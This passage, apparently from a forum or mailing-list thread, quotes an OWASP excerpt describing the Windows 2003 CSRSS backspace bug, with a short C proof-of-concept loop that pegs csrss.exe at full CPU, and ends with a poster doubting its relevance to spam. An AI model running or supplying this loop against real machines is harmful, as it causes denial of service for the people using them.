 injection into html wich can be executed in an email,
 i will make the PoC code and explain how here and now...

For those lazy enough to search:

https://www.owasp.org/index.php/The_CSRSS_Backspace_Bug_still_works_in_windows_2003_sp1

Excerpt:

Basicaly just compile this and you will get a 100% processor usage by the
compiled exploit and Csrss.exe

#include <stdio.h>
int main(void)
{
while(1)
printf("\t\t\b\b\b\b\b\b");
return 0;
}


How this helps in sending spam is beyond me.
